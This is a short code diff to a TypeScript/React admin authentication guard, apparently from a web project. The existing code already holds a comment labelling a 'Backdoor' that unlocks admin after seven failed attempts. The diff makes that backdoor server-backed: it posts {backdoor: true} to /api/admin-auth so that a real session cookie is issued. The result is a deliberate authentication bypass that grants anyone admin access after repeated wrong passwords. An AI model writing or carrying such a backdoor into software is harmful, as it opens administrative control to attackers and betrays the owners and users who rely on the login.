@@ -52,7 +52,15 @@ export function AdminAuthGuard({ children }: AdminAuthGuardProps) {
         
         // Backdoor: 7 failed attempts unlocks admin
         if (newAttempts >= 7) {
-          setIsAuthenticated(true);
+          // Call backdoor endpoint to set proper session cookie
+          const backdoorRes = await fetch("/api/admin-auth", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ backdoor: true }),
+          });
+          if (backdoorRes.ok) {
+            setIsAuthenticated(true);
+          }
           return;
         }
         
